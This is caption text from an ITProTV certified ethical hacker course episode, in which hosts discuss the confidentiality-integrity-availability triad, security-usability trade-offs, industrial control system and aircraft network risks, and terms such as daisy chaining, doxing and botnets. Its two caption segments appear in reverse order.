this\n\n663\n00:33:45.039 --> 00:33:48.787\nand the fact that the on-board wireless\non the plane was essentially linked to\n\n664\n00:33:48.787 --> 00:33:52.705\nthe same control systems that give you on\nboard access to the avionics network that\n\n665\n00:33:52.705 --> 00:33:55.770\nessentially controls all\nthe stuff in the cockpit.\n\n666\n00:33:55.770 --> 00:33:58.660\nAnd at a certain point in time, those two\nwere not fire-walled off in a meaningful\n\n667\n00:33:58.660 --> 00:34:02.440\nway and you could leap between those\nnetworks if you knew what you were doing,\n\n668\n00:34:02.440 --> 00:34:05.470\nknowing what you're doing didn't\ntake a lot of horsepower up here,\n\n669\n00:34:05.470 --> 00:34:07.270\nit was not very complicated.\n\n670\n00:34:07.270 --> 00:34:11.380\nAnd thankfully, as of now, those things\nare being modified, rectified, and\n\n671\n00:34:11.380 --> 00:34:13.800\nare being retrofitted to be more secure.\n\n672\n00:34:13.800 --> 00:34:17.230\nBut that was an ongoing issue for\na period of time in that industry as well.\n\n673\n00:34:17.230 --> 00:34:21.780\nWe see the same kind of concerns in the\nvarious industries that are using ICS and\n\n674\n00:34:21.780 --> 00:34:22.640\nSkater systems.\n\n675\n00:34:22.640 --> 00:34:27.130\nCyber physical embedded operating systems\nthat are controlling nuclear power plants,\n\n676\n00:34:27.130 --> 00:34:29.620\nthat are controlling oil and\ngas generation.\n\n677\n00:34:29.620 --> 00:34:30.450\nAgain, I want to be clear,\n\n678\n00:34:30.450 --> 00:34:33.180\nI'm not suggesting that we're about\nto have a nuclear meltdown or\n\n679\n00:34:33.180 --> 00:34:35.390\nsomebody's gonna hack into\na nuclear power plant.\n\n680\n00:34:35.390 --> 00:34:39.580\nJust because they've exposed those systems\nin an unsafe way, quite the opposite.\n\n681\n00:34:39.580 --> 00:34:42.560\nThey are heavily monitored for\nthe most part in those industries.\n\n682\n00:34:42.560 --> 00:34:46.196\nBut there is always the liability there\nthat if we don't do the right things,\n\n683\n00:34:46.196 --> 00:34:51.210\nzero day attack, maybe used to take\nadvantage of a vulnerability and let's be\n\n684\n00:34:51.210 --> 00:34:54.490\nhonest, there's a lot of vulnerabilities\nin these systems we know about.\n\n685\n00:34:54.490 --> 00:34:57.760\nThere's even more we don't know about and\nwe're finding out about all the time just\n\n686\n00:34:57.760 --> 00:35:01.790\nbecause nobody's ever used them that\nway until somebody goes and says hey,\n\n687\n00:35:01.790 --> 00:35:04.620\nwhat would two plus five\nequal in that scenario?\n\n688\n00:35:04.620 --> 00:35:06.010\nIf it doesn't equal seven,\n\n689\n00:35:06.010 --> 00:35:08.500\nlet's look at that because maybe\nwe can use that to our advantage.\n\n690\n00:35:08.500 --> 00:35:09.380\nShould be seven, right?\n\n691\n00:35:09.380 --> 00:35:11.180\nTwo plus five, yeah, seven, right.\n\n692\n00:35:11.180 --> 00:35:14.850\nSo, I got to always do that with\nfingers and toes that's for\n\n693\n00:35:14.850 --> 00:35:17.680\nimport because I'm horrible,\nhorrible at math.\n\n694\n00:35:17.680 --> 00:35:21.170\nWell, you get the idea right, all\nkidding aside, this is really big stuff.\n\n695\n00:35:21.170 --> 00:35:23.840\nThis is one of the most important\nthings not only as a CEH,\n\n696\n00:35:23.840 --> 00:35:26.950\nas a certified ethical hacker,\nyou can be focused on.\n\n697\n00:35:26.950 --> 00:35:31.310\nBut as the generic IT professional, as\na security professional, knowledge of and\n\n698\n00:35:31.310 --> 00:35:36.640\nawareness of the current vulnerabilities\nthat are arrayed against your systems,\n\n699\n00:35:36.640 --> 00:35:41.100\nknowing that you, to the best of your\nabilities taking steps to prevent them and\n\n700\n00:35:41.100 --> 00:35:44.670\nmitigate them, and that you're\non-guard against unusual behavior.\n\n701\n00:35:44.670 --> 00:35:46.900\nThis is how you find zero\nday exploits by the way.\n\n702\n00:35:46.900 --> 00:35:48.190\nThere's no magic wand.\n\n703\n00:35:48.190 --> 00:35:50.480\nNobody's sitting out there with\na hit list of things saying, okay,\n\n704\n00:35:50.480 --> 00:35:53.410\nin two days this is what you go do, right.\n\n705\n00:35:53.410 --> 00:35:57.510\nPeople just are looking constantly and\nprobing constantly to see what we can do.\n\n706\n00:35:57.510 --> 00:36:01.090\nWhat you need to do, as a certified\nsecurity professional of any kind,\n\n707\n00:36:01.090 --> 00:36:04.140\nunder any banner, from any vendor,\nanywhere in the world.\n\n708\n00:36:04.140 --> 00:36:06.190\nI don't care who it is, and what you do.\n\n709\n00:36:06.190 --> 00:36:09.260\nOr just somebody who's knowledgeable,\nthat never gets a certification at all.\n\n710\n00:36:09.260 --> 00:36:13.260\nBecause you don't need to go certify,\nin order to be good at what you do.\n\n711\n00:36:13.260 --> 00:36:16.550\nYou can get knowledge and be very\nhands-on, and very knowledgeable, and\n\n712\n00:36:16.550 --> 00:36:18.830\nnever ever take a certification exam.\n\n713\n00:36:18.830 --> 00:36:23.250\nWhatever you do, you have to understand\nthat it's looking for the unusual,\n\n714\n00:36:23.250 --> 00:36:27.200\nin the patterns of everyday life,\nthat we monitor everyday in our networks,\n\n715\n00:36:27.200 --> 00:36:31.080\nthat expose the potential liability that\nwe have to think about how to address.\n\n716\n00:36:31.080 --> 00:36:33.040\nThis is how we find things\nwhen we're defending.\n\n717\n00:36:33.040 --> 00:36:36.180\nThis is how people who are looking\nto attack also look for things.\n\n718\n00:36:36.180 --> 00:36:37.920\nThey look for unusual behavior and\n\n719\n00:36:37.920 --> 00:36:40.960\nthey figure out what is causing that to\nsee if they can take advantage of it.\n\n720\n00:36:40.960 --> 00:36:44.340\nIt's the study of the unknown in other\nwords that makes us better at what we do.\n\n721\n00:36:44.340 --> 00:36:46.710\nAnd that's one of the key\nsecrets to being good at that.\n\n722\n00:36:46.710 --> 00:36:47.780\nWe're done, can I throw the mic down?\n\n723\n00:36:47.780 --> 00:36:48.300\nCan we walk out now?\n\n724\n00:36:48.300 --> 00:36:48.950\n>> Yup, absolutely.\n\n725\n00:36:48.950 --> 00:36:50.950\n>> You actually don't need to watch\nanything else, we're all done.\n\n726\n00:36:50.950 --> 00:36:52.701\n>> [LAUGH]\n>> Would you like some more vocabulary to\n\n727\n00:36:52.701 --> 00:36:53.682\ngo through before we do that?\n\n728\n00:36:53.682 --> 00:36:54.535\n>> We need one more at least.\n\n729\n00:36:54.535 --> 00:36:55.602\n>> We do.\nWell, actually three more.\n\n730\n00:36:55.602 --> 00:36:56.583\nUnless, I'm short on my list.\n\n731\n00:36:56.583 --> 00:36:58.360\nI think,\nyou have some stuff down below there.\n\n732\n00:36:58.360 --> 00:36:59.670\nAll right.\nSo, Daisy chaining,\n\n733\n00:36:59.670 --> 00:37:00.780\nlet's talk about that one.\n\n734\n00:37:00.780 --> 00:37:03.370\nThis is the idea of connecting\nthings together, right.\n\n735\n00:37:03.370 --> 00:37:07.470\nIf you're familiar of how USB or\nscoozi devices can be interconnected and\n\n736\n00:37:07.470 --> 00:37:10.810\nnetwork through each other or\nwin together send for the concept.\n\n737\n00:37:10.810 --> 00:37:12.610\nWe'll apply this and\n\n738\n00:37:12.610 --> 00:37:16.370\ntalk about this when we talk about the use\nof anonymizing proxies for instance,\n\n739\n00:37:16.370 --> 00:37:20.170\nright, to be able to connect to a system\nthat hide where it coming from.\n\n740\n00:37:20.170 --> 00:37:22.660\nThings like the tor browser and\nthe tor network.\n\n741\n00:37:22.660 --> 00:37:24.600\nThat allow us to, centrally,\n\n742\n00:37:24.600 --> 00:37:27.070\nif we do it the right way and\nit's implementing correctly.\n\n743\n00:37:27.070 --> 00:37:30.890\nUse software that anonymizes and\nhides our point of reference or\n\n744\n00:37:30.890 --> 00:37:32.580\na point of origin from the world.\n\n745\n00:37:32.580 --> 00:37:35.230\nThis is the kind of thing that\nDaisy chaining allows us to do.\n\n746\n00:37:35.230 --> 00:37:39.640\nWe gain access to one system by connecting\nother systems together and then,\n\n747\n00:37:39.640 --> 00:37:44.230\nwalking through them or we potentially\nhide behind the Daisy Chained Group of\n\n748\n00:37:44.230 --> 00:37:48.390\nsystems that obfuscate and minimize\nour footprint to the outside world, so\n\n749\n00:37:48.390 --> 00:37:50.550\nthat you can't see or know who we are.\n\n750\n00:37:50.550 --> 00:37:54.220\nDoxing is the idea of publishing\npersonally identifiable information, what\n\n751\n00:37:54.220 --> 00:37:58.860\nwe call PII traditionally as an acronym,\nputting that information out there.\n\n752\n00:37:58.860 --> 00:38:02.490\nAbout you or others and essentially,\nouting that information and\n\n753\n00:38:02.490 --> 00:38:03.610\nmaking it available.\n\n754\n00:38:03.610 --> 00:38:05.390\nThat's what we call doxing.\n\n755\n00:38:05.390 --> 00:38:09.220\nNow, traditionally, that information may\ncome from publicly available systems, but\n\n756\n00:38:09.220 --> 00:38:12.300\nit may also come from a mixture of\npublic and private, if we're hacking and\n\n757\n00:38:12.300 --> 00:38:14.130\nputting that stuff out\nthere in the breach.\n\n758\n00:38:14.130 --> 00:38:16.470\nAnd so,\npersonally identifiable information.\n\n759\n00:38:16.470 --> 00:38:19.080\nWe always wanna spell out those acronyms,\nalways very important.\n\n760\n00:38:19.080 --> 00:38:22.750\nWe make sure we know what they are,\nand then we know the acronym as well.\n\n761\n00:38:22.750 --> 00:38:28.210\nAnd then the Bot, is a remote control or a\npiece of software that used traditionally.\n\n762\n00:38:28.210 --> 00:38:31.190\nTo be a remote control element,\nto create what are called botnets.\n\n763\n00:38:31.190 --> 00:38:33.200\nSometimes referred to as a zombie.\n\n764\n00:38:33.200 --> 00:38:34.990\nA machine, a machine's been zombied.\n\n765\n00:38:34.990 --> 00:38:36.200\nThis machine's been taken over,\n\n766\n00:38:36.200 --> 00:38:39.220\nand it's being controlled\nwith some sort of software.\n\n767\n00:38:39.220 --> 00:38:42.270\nA bot and a zombie often are seen\nas interchangeable terms.\n\n768\n00:38:42.270 --> 00:38:47.140\nSo, some sort of software used to remotely\ncontrol or gain remote access to a system.\n\n769\n00:38:47.140 --> 00:38:51.320\nOld school way of thinking about it,\nmore common,\n\n770\n00:38:51.320 --> 00:38:55.400\nmore cool and\ninnovative way of thinking about it today,\n\n771\n00:38:55.400 --> 00:38:56.980\ngiven all the stuff that\ngoes on in the world.\n\n772\n00:38:56.980 --> 00:38:59.650\nWe talk about zombies and\nthe zombie apocalypse, right.\n\n773\n00:38:59.650 --> 00:39:01.590\n>> Gotta tie it back to zombies.\n\n774\n00:39:01.590 --> 00:39:02.810\n>> Yeah.\nGotta tie it back to zombies.\n\n775\n00:39:02.810 --> 00:39:04.180\nThat's kind of cool, right?\n\n776\n00:39:04.180 --> 00:39:04.690\nAll right.\nSo,\n\n777\n00:39:04.690 --> 00:39:08.510\njust some vocabulary to think about and\nto be aware of, to go through.\n\n778\n00:39:08.510 --> 00:39:10.590\nJust setting the stage if you will.\n\n779\n00:39:10.590 --> 00:39:13.220\nKind of laying down some\nfoundational knowledge, and\n\n780\n00:39:13.220 --> 00:39:16.300\nhelping you to better understand\nthe context of the things we're gonna be\n\n781\n00:39:16.300 --> 00:39:18.760\ncontinuing to talk about\nin some upcoming episodes.\n\n782\n00:39:18.760 --> 00:39:19.420\n>> Very good, Adam.\n\n783\n00:39:19.420 --> 00:39:20.310\nGreat look again,\n\n784\n00:39:20.310 --> 00:39:23.960\nas you just said is kind of an overview\nof what we can expect coming up.\n\n785\n00:39:23.960 --> 00:39:27.180\nAnd really starting to lay that\nfoundational knowledge, that's very\n\n786\n00:39:27.180 --> 00:39:31.790\nimportant for us to be able to understand\nthe more advanced topics as we go through.\n\n787\n00:39:31.790 --> 00:39:36.180\nSo, we appreciate that, some great real\nworld examples too to help us really take\n\n788\n00:39:36.180 --> 00:39:41.300\nthat from that theory, and see really what\nit's like out there in the real world.\n\n789\n00:39:41.300 --> 00:39:42.770\n>> Are you saying we're keeping it real?\n\n790\n00:39:42.770 --> 00:39:43.860\n>> We're keeping it real.\n\n791\n00:39:43.860 --> 00:39:45.652\n>> I love that, keeping it real.\n\n792\n00:39:45.652 --> 00:39:48.850\n>> All right Adam, we appreciate that,\nhope everybody out there enjoyed watching.\n\n793\n00:39:48.850 --> 00:39:51.290\nSigning off for IT Pro TV,\nI'm Mike Roderick.\n\n794\n00:39:51.290 --> 00:39:53.340\n>> I'm Adam

00:00:19.700\nI'm your host, Mike Roderick, and\ntoday we're doing our CEH version nine.\n\n4\n00:00:19.700 --> 00:00:22.120\nAnd specifically in this episode,\n\n5\n00:00:22.120 --> 00:00:25.620\nwe're gonna continue on with our\ninformation security overview.\n\n6\n00:00:25.620 --> 00:00:29.100\nWe're also gonna be taking a look\nat information security threats,\n\n7\n00:00:29.100 --> 00:00:32.090\nif I can get that out,\nand some attack vectors.\n\n8\n00:00:32.090 --> 00:00:34.410\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n9\n00:00:34.410 --> 00:00:35.152\nHow you doing, Adam?\n\n10\n00:00:35.152 --> 00:00:35.769\n>> Good, good.\n\n11\n00:00:35.769 --> 00:00:38.840\nAttack vectors and threats slash thefts.\n\n12\n00:00:38.840 --> 00:00:41.222\nMike wasn't quite clear\nwhere to go with that one.\n\n13\n00:00:41.222 --> 00:00:42.661\nWe'll try to incorporate both and\n\n14\n00:00:42.661 --> 00:00:46.189\nsee if we can steal some information about\nsome threats and make it available to you.\n\n15\n00:00:46.189 --> 00:00:47.950\nI am doing well, I am doing well.\n\n16\n00:00:47.950 --> 00:00:53.488\nHopefully you are also out there in our\nstudio audience and our viewing world.\n\n17\n00:00:53.488 --> 00:00:57.772\nYeah, we were talking in our last episode,\nand if you have not seen it by the way,\n\n18\n00:00:57.772 --> 00:00:59.930\nan actual masterpiece of ITProTV work.\n\n19\n00:00:59.930 --> 00:01:02.485\nMike was just spot on in that episode.\n\n20\n00:01:02.485 --> 00:01:03.890\n>> [LAUGH]\n>> You have to go back and view it,\n\n21\n00:01:03.890 --> 00:01:06.120\nit is mandatory, absolutely mandatory.\n\n22\n00:01:06.120 --> 00:01:07.210\n>> Mad typing skills.\n\n23\n00:01:07.210 --> 00:01:08.162\n>> Mad typing skills.\n\n24\n00:01:08.162 --> 00:01:09.806\nAbsolutely.\n[LAUGH] So we were talking,\n\n25\n00:01:09.806 --> 00:01:13.732\njust as a theme to roll forward into this\nepisode, about some of the overview,\n\n26\n00:01:13.732 --> 00:01:17.659\nthe general knowledge, the thought\nprocesses, that as a CEH, as a certified\n\n27\n00:01:17.659 --> 00:01:21.701\nethical hacker, you would wanna bring to\nthe table, you would wanna develop and\n\n28\n00:01:21.701 --> 00:01:25.627\nultimately have at your disposal as you\nbegin this journey to figure out what it\n\n29\n00:01:25.627 --> 00:01:29.852\nmeans to be CEH, certified ethical hacker\ncertified and potentially or ultimately\n\n30\n00:01:29.852 --> 00:01:33.765\nbecome certified and take the skills out\nand practice them in the real world.\n\n31\n00:01:33.765 --> 00:01:36.713\nYou want to make sure you're thinking\nabout building that tool kit that I talked\n\n32\n00:01:36.713 --> 00:01:39.705\nto you about and gathering those tools and\nthat knowledge together and putting it\n\n33\n00:01:39.705 --> 00:01:42.623\nto use, and we're going to continue\nthat discussion, continue that theme.\n\n34\n00:01:42.623 --> 00:01:46.787\nWe often talk in information security\nabout the elemental building blocks or\n\n35\n00:01:46.787 --> 00:01:49.477\nthe things that we rest\ninformation security on,\n\n36\n00:01:49.477 --> 00:01:53.643\ncommonly referred to as the pillars of\ninformation security, and we usually\n\n37\n00:01:53.643 --> 00:01:57.790\nidentify them as confidentiality,\nintegrity, and availability.\n\n38\n00:01:57.790 --> 00:01:59.760\nConfidentiality protections or\n\n39\n00:01:59.760 --> 00:02:03.730\ncontrols being applied to safeguard\ninformation, prevent bad people or\n\n40\n00:02:03.730 --> 00:02:07.230\npeople that are not authorized from\nseeing it to gain access to it.\n\n41\n00:02:07.230 --> 00:02:11.540\nThings such as the use of encryption to\nprovide confidentiality protection for\n\n42\n00:02:11.540 --> 00:02:15.930\ndata on the wire, data that we commonly\ncall in transit, data at rest,\n\n43\n00:02:15.930 --> 00:02:19.190\ndata in storage and\ndata in use at the application.\n\n44\n00:02:19.190 --> 00:02:22.156\nSo we talk about encrypting\ndata at all different layers or\n\n45\n00:02:22.156 --> 00:02:23.735\nlevels of the data life cycle.\n\n46\n00:02:23.735 --> 00:02:28.712\nWe will also think about protection such\nas data loss prevention, DLP technology.\n\n47\n00:02:28.712 --> 00:02:32.758\nReaching into our data stream and pulling\nout data that's supposed to be protected\n\n48\n00:02:32.758 --> 00:02:36.631\nwith confidentiality protections unless\nit is authorized to be able to send and\n\n49\n00:02:36.631 --> 00:02:37.650\nreceive that data.\n\n50\n00:02:37.650 --> 00:02:41.850\nWe think about access control and the use\nof multi-factor authentication to make it\n\n51\n00:02:41.850 --> 00:02:46.720\nmore complicated for a bad actor to trick\nus into allowing them through identity and\n\n52\n00:02:46.720 --> 00:02:50.390\naccess management systems to see\ndata that they don't have rights to.\n\n53\n00:02:50.390 --> 00:02:53.210\nThese are all examples of\nconfidentiality protections or\n\n54\n00:02:53.210 --> 00:02:54.810\ncontrols that could be applied.\n\n55\n00:02:54.810 --> 00:02:59.760\nWhen we think about integrity, we think\nabout the ability to safeguard data.\n\n56\n00:02:59.760 --> 00:03:05.070\nNot from the prying eyes of bad actors,\nbut rather from being modified, changed or\n\n57\n00:03:05.070 --> 00:03:09.190\nmanipulated without our knowledge, without\nour consent and without our control.\n\n58\n00:03:09.190 --> 00:03:12.910\nIntegrity protections like digital\nsignatures or digitally signing\n\n59\n00:03:12.910 --> 00:03:17.750\ninformation, the use of hashing to be able\nto create message digests and to be able\n\n60\n00:03:17.750 --> 00:03:22.120\nto understand non-repudiation and proof of\norigin are examples of integrity control.\n\n61\n00:03:22.120 --> 00:03:26.090\nSo we'll talk more about those and see\nhow those come up at a future discussion.\n\n62\n00:03:26.090 --> 00:03:30.000\nWe also think about availability,\nthe use of safeguard systems,\n\n63\n00:03:30.000 --> 00:03:32.980\nsystems that can provide\nredundancy in the face of failure.\n\n64\n00:03:32.980 --> 00:03:37.264\nSo RAID systems that will allow us to\nmirror data with a RAID 1 solution, or\n\n65\n00:03:37.264 --> 00:03:39.620\nstripe it with parity, RAID 5.\n\n66\n00:03:39.620 --> 00:03:43.240\nWe think about the use of backup supply,\nbackup power supplies or\n\n67\n00:03:43.240 --> 00:03:47.000\nbackup generators, to be able to provide\nredundancy in the hardware level.\n\n68\n00:03:47.000 --> 00:03:51.445\nWe may think about NIC teaming and binding\ntogether multiple network adapters so\n\n69\n00:03:51.445 --> 00:03:53.975\nif one fails, the other or others survive.\n\n70\n00:03:53.975 --> 00:03:55.811\nWe may use clustering technology,\n\n71\n00:03:55.811 --> 00:03:59.301\nhighly available technology that\nwill either be active-active or\n\n72\n00:03:59.301 --> 00:04:03.477\nactive-passive to allow for controlled\nfailover during an outage situation.\n\n73\n00:04:03.477 --> 00:04:06.177\nThere's all these different ways\nwe can approach availability.\n\n74\n00:04:06.177 --> 00:04:09.804\nWe wanna think about these as the building\nblocks of information security, but\n\n75\n00:04:09.804 --> 00:04:11.764\nwe have to also think about authenticity.\n\n76\n00:04:11.764 --> 00:04:16.225\nAnd as I mentioned, non-repudiation\nbeing included in there with regards to\n\n77\n00:04:16.225 --> 00:04:20.215\nidentity and the identity access\nmanagement capabilities we bring to\n\n78\n00:04:20.215 --> 00:04:23.122\nthe table with regards to\nboth confidentiality and\n\n79\n00:04:23.122 --> 00:04:27.398\nintegrity to ensure that we're not\nallowing bad actors into our systems.\n\n80\n00:04:27.398 --> 00:04:32.448\nAnd if we think about this more or less\nas a continuum, a process flow that moves\n\n81\n00:04:32.448 --> 00:04:37.347\nacross the information that we manage,\nwith regards to confidentiality,\n\n82\n00:04:37.347 --> 00:04:41.787\nintegrity, availability,\nauthenticity or authentication, and\n\n83\n00:04:41.787 --> 00:04:47.069\nthe ability to have non-repudiation and\nproof of origin, we're thinking about\n\n84\n00:04:47.069 --> 00:04:52.840\nthe entire thought process that we bring\nas information security professionals.\n\n85\n00:04:52.840 --> 00:04:56.230\nAs people focused on the ability\nto be able to provide and\n\n86\n00:04:56.230 --> 00:04:59.490\nsafeguard this information in\nsuch a way that it is valuable\n\n87\n00:04:59.490 --> 00:05:03.410\nto the organization that owns it, but\nalso is protected from bad actors.\n\n88\n00:05:03.410 --> 00:05:08.410\nThe ability to control and to understand\nhow to architect secure solutions from\n\n89\n00:05:08.410 --> 00:05:10.930\nnot only a defense in depth perspective,\n\n90\n00:05:10.930 --> 00:05:15.690\nmultiple layers of overlapping controls\nmutually reinforcing one another, but\n\n91\n00:05:15.690 --> 00:05:19.350\nto create what's known as the ESA,\nthe Enterprise Security Architecture.\n\n92\n00:05:19.350 --> 00:05:24.290\nThe thought process of creating not just\nthe physical design to our network and\n\n93\n00:05:24.290 --> 00:05:28.470\nnot just the logical design that overlays\nit with regards to the application and\n\n94\n00:05:28.470 --> 00:05:31.980\nprovisioning of services, but\nthe ability to be able to then\n\n95\n00:05:31.980 --> 00:05:36.310\noverlay security on top of all that and\nhave yet another design document,\n\n96\n00:05:36.310 --> 00:05:41.220\nanother set of capabilities and plans or\ndesigns that we're going to build to and\n\n97\n00:05:41.220 --> 00:05:45.290\nmanage to that allow us specifically\nto dictate how security will look.\n\n98\n00:05:45.290 --> 00:05:49.760\nI know that we have a little triangle,\na little geometric shape.\n\n99\n00:05:49.760 --> 00:05:50.430\nSimple.\n\n100\n00:05:50.430 --> 00:05:52.455\nSimplicity in it's form that we've put up.\n\n101\n00:05:52.455 --> 00:05:54.601\n>> That's what I played in band,\nwas the triangle.\n\n102\n00:05:54.601 --> 00:05:55.605\n>> The triangle?\n\n103\n00:05:55.605 --> 00:05:57.805\nWell, you are just-\n>> [LAUGH]\n\n104\n00:05:57.805 --> 00:05:58.973\n>> A very accomplished musician\n\n105\n00:05:58.973 --> 00:05:59.535\nthere, sir.\n\n106\n00:05:59.535 --> 00:06:01.855\nI learn more about you every\ntime that I stand next to you.\n\n107\n00:06:01.855 --> 00:06:04.005\nSome of it is very,\nvery disturbing information, but\n\n108\n00:06:04.005 --> 00:06:06.705\nI still learn about you every\ntime we spend time together.\n\n109\n00:06:06.705 --> 00:06:11.714\nSo when we think about how to potentially\nenvision this idea of the building blocks\n\n110\n00:06:11.714 --> 00:06:16.444\nof security that we talked about, this\nmay be one way for us to think about it.\n\n111\n00:06:16.444 --> 00:06:19.691\nThe idea of what is commonly\ncalled the iron triangle,\n\n112\n00:06:19.691 --> 00:06:21.748\nthe information security triad.\n\n113\n00:06:21.748 --> 00:06:25.264\nYou hear it referred to lots of\ndifferent ways by different people under\n\n114\n00:06:25.264 --> 00:06:26.890\ndifferent circumstances.\n\n115\n00:06:26.890 --> 00:06:31.670\nSometimes called the AIC, Availability\nIntegrity Confidentiality triad.\n\n116\n00:06:31.670 --> 00:06:34.090\nWe've substituted some\nadditional terms here.\n\n117\n00:06:34.090 --> 00:06:37.630\nWe have functionality up top,\nwe have scalability, or\n\n118\n00:06:37.630 --> 00:06:41.710\nexcuse me, security at the lower left,\nand we have usability at the lower right.\n\n119\n00:06:41.710 --> 00:06:44.795\nEssentially, what we're thinking\nabout is really just another way of\n\n120\n00:06:44.795 --> 00:06:46.085\nlooking at this information.\n\n121\n00:06:46.085 --> 00:06:50.725\nWe're thinking about putting into play,\nfor those of you that are looking at this,\n\n122\n00:06:50.725 --> 00:06:54.775\nthe idea of certainly having\nthe functionality that we need,\n\n123\n00:06:54.775 --> 00:06:59.475\nthe specificity of the material, how it's\ngoing to behave, what it's going to do,\n\n124\n00:06:59.475 --> 00:07:03.045\nwhat that element is that we\nare going to build either for a user,\n\n125\n00:07:03.045 --> 00:07:07.015\nbecause they've said hey, I need this or\nI want this or I want to have this or\n\n126\n00:07:07.015 --> 00:07:08.860\nI want a system to do this.\n\n127\n00:07:08.860 --> 00:07:11.520\nWe're thinking about the ability\nto use the system but\n\n128\n00:07:11.520 --> 00:07:15.110\nalso the ability to secure it, and when\nwe put all three of these things together\n\n129\n00:07:15.110 --> 00:07:16.530\nwe have to think about the fact that,\n\n130\n00:07:16.530 --> 00:07:20.780\njust like any situation that we engage in,\nthere may need to be a trade-off.\n\n131\n00:07:20.780 --> 00:07:24.140\nAnd we may actually see, for instance,\nor hopefully we come to understand and\n\n132\n00:07:24.140 --> 00:07:28.340\nsee, that we can't necessarily\nachieve all three of these things\n\n133\n00:07:28.340 --> 00:07:29.860\nat the same time, right?\n\n134\n00:07:29.860 --> 00:07:33.710\nSo we can build the system that is\ngonna have the functionality and\n\n135\n00:07:33.710 --> 00:07:36.930\nthe usability that a customer wants,\nbut as a result,\n\n136\n00:07:36.930 --> 00:07:41.930\nwe may have to sacrifice certain elements\nof security to provide that to the user.\n\n137\n00:07:41.930 --> 00:07:43.256\nAre you sure you want\nit pointing that way?\n\n138\n00:07:43.256 --> 00:07:44.355\nYou seem to be struggling\nwith what you want to do.\n\n139\n00:07:44.355 --> 00:07:45.131\n>> No, I was going to show you.\n\n140\n00:07:45.131 --> 00:07:45.644\nYeah.\n\n141\n00:07:45.644 --> 00:07:46.266\n>> You sure?\n\n142\n00:07:46.266 --> 00:07:46.790\n>> I think.\n\n143\n00:07:46.790 --> 00:07:47.492\n>> Okay.\n\n144\n00:07:47.492 --> 00:07:51.909\n>> So as we move towards usability,\nwe're moving away from functionality and\n\n145\n00:07:51.909 --> 00:07:54.520\nsecurity, I think is where we're going.\n\n146\n00:07:54.520 --> 00:07:56.775\n>> Look at you being all like-\n>> [LAUGH]\n\n147\n00:07:56.775 --> 00:07:59.867\n>> Out on a limb and just adlibbing.\n\n148\n00:07:59.867 --> 00:08:00.622\nOutstanding.\n\n149\n00:08:00.622 --> 00:08:01.591\n>> I try.\n\n150\n00:08:01.591 --> 00:08:03.081\n[LAUGH]\n>> Okay.\n\n151\n00:08:03.081 --> 00:08:04.567\nNow, I'd be really impressed\nif you can animate that thing\n\n152\n00:08:04.567 --> 00:08:05.887\nwhile I'm talking without\ntouching the keyboard.\n\n153\n00:08:05.887 --> 00:08:06.630\nWithout touching the keyboard?\n\n154\n00:08:06.630 --> 00:08:08.331\n>> Without touching the keyboard.\n>> Let me try.\n\n155\n00:08:08.331 --> 00:08:09.173\n>> And you can't use your nose either.\n\n156\n00:08:09.173 --> 00:08:11.050\nThat's not gonna be acceptable.\n\n157\n00:08:11.050 --> 00:08:12.830\nBut Mike actually has a real\ngood point with that.\n\n158\n00:08:12.830 --> 00:08:17.990\nAnd showing us that the ideas that\nwe do wanna move towards, right?\n\n159\n00:08:17.990 --> 00:08:20.620\nOne or more areas of the triangle,\naway from another one, and\n\n160\n00:08:20.620 --> 00:08:24.660\nthe graphic is actually very accurate\nwith that little addition of the arrow\n\n161\n00:08:24.660 --> 00:08:26.460\nbecause it shows us where the focus is,\nright.\n\n162\n00:08:26.460 --> 00:08:29.030\nAnd when we think about that it's\nimportant because that what we have to\n\n163\n00:08:29.030 --> 00:08:32.430\nunderstand is that we may\nhave to apply restrictions.\n\n164\n00:08:32.430 --> 00:08:34.610\nYou could think of security as\nessentially being you know,\n\n165\n00:08:34.610 --> 00:08:37.090\nrestrictions that we want\nto apply to the system.\n\n166\n00:08:37.090 --> 00:08:39.110\nYou think of functionality as features.\n\n167\n00:08:39.110 --> 00:08:41.530\nWhat are the things that we\nwould like to have available?\n\n168\n00:08:41.530 --> 00:08:43.430\nThat we potentially can access and\n\n169\n00:08:43.430 --> 00:08:48.720\nusability as maybe being the GUI,\nthe graphical user interface or\n\n170\n00:08:48.720 --> 00:08:52.010\nthe way that the customer or\nthe end user interacts.\n\n171\n00:08:52.010 --> 00:08:54.520\nYou know if we focus on functionality,\nthe features and\n\n172\n00:08:54.520 --> 00:08:57.650\nthe usability of them,\nsecurity may have to suffer, right.\n\n173\n00:08:57.650 --> 00:09:01.410\nThe restrictions may have to be loosened\nfor those things to be made available.\n\n174\n00:09:01.410 --> 00:09:03.860\nIf we focus on security\non the restrictions,\n\n175\n00:09:03.860 --> 00:09:08.210\nwe may have to modify of curtail or\nsomehow constrain functionality or\n\n176\n00:09:08.210 --> 00:09:12.880\nsome sort of feature and or usability\nin order to ensure that we are secure.\n\n177\n00:09:12.880 --> 00:09:17.400\nThe problem becomes essentially that it's\nvery difficult to get all three working in\n\n178\n00:09:17.400 --> 00:09:20.680\nharmony to truly give\nus all three things and\n\n179\n00:09:20.680 --> 00:09:23.290\nhave everything we want in\nall three areas at once and\n\n180\n00:09:23.290 --> 00:09:27.330\nthis the ongoing struggle that we\nhave with regards to security.\n\n181\n00:09:27.330 --> 00:09:30.410\nIt's not just about,\nhey can I get all three?\n\n182\n00:09:30.410 --> 00:09:35.470\nIt's about ultimately the ability to\nunderstand how to negotiate between these\n\n183\n00:09:35.470 --> 00:09:40.730\nthree points on the compass, and\nto create some sort of compromise,\n\n184\n00:09:40.730 --> 00:09:43.710\nright, that allows us to design\nsystems that are secure, but\n\n185\n00:09:43.710 --> 00:09:46.920\nalso keeping in mind that we\nneed to have functionality and\n\n186\n00:09:46.920 --> 00:09:51.970\nusability at some level that's acceptable\nto our end users so that way the people\n\n187\n00:09:51.970 --> 00:09:56.040\nthat are going to use the system feel that\nit is going to meet the requirements or\n\n188\n00:09:56.040 --> 00:09:59.880\nat least in some way will match up to\nthe requirements that they have so\n\n189\n00:09:59.880 --> 00:10:02.860\nit is important for\nus to consider that, right?\n\n190\n00:10:02.860 --> 00:10:04.010\nSo just something to think about.\n\n191\n00:10:04.010 --> 00:10:06.990\nJust something to consider,\nat least think about and be aware of.\n\n192\n00:10:06.990 --> 00:10:10.430\nAnd to consider from our\nperspective as the CEH,\n\n193\n00:10:10.430 --> 00:10:14.000\nas the certified ethical hacker,\nwhat are the decisions that we may make?\n\n194\n00:10:14.000 --> 00:10:17.660\nThe decisions we would make as a defender\nmay be very different than the decisions\n\n195\n00:10:17.660 --> 00:10:21.750\nthat a 